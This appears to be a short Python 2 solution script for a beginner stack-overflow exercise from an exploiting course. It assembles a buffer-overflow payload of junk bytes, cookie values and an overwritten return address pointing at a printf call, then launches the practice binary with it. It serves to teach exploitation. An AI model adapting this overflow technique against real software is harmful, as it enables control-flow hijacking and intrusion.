# http://www.ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/013%20stack10.idb/
import struct
import subprocess

argv1 = "A"
argv2 = "I"

buf = "\x49" * 49 #49 bytes de basura
var_8 = struct.pack("<I", 0x10101010) #Redirijo eax hacia 0x10101010 que se encuentra en el address space y contiene "\x55\x8b" ebp
var_4 = "YouW"
s = "inCC"
r= "DDDD" # => edx (se suma 1 y se coloca en edx)
arg_0 = struct.pack("<I", 0x71885A53) # Cookie2
arg_4 = "GGGG" # junk

#Salto a printf %s (no tiene mucho sentido saltar a printf %p)
eip = struct.pack("<I", 0x1010114B) # => salta al call printf
#Como seteo el mensaje?
#Se le envia como parametro de printf la direccion de Dest del buffer (NOTA: igual que un ret2libc)
p_arg1 = struct.pack("<I", 0x10103056)
payload = argv2+buf+var_8+var_4+s+r+arg_0+arg_4+eip+p_arg1

print "[#] Sending Payload"
subprocess.call(["stack7v5b.exe", argv1, payload])
